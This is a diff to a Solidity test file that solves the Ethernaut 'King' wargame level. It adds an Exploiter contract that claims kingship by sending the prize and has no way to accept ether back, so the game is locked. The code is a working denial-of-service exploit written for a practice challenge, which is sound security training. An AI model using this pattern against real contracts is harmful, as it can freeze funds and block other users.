@@ -34,10 +34,15 @@ contract TestKing is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
-        vm.startPrank(player, player);
-
+        vm.startPrank(player);
+        Exploiter exp = new Exploiter{value: level.prize()}(address(level));
         vm.stopPrank();
+    }
+}
+
+contract Exploiter {
+    constructor(address level) public payable {
+        (bool success, ) = level.call{value: msg.value}("");
+        assert(success);
     }
 }
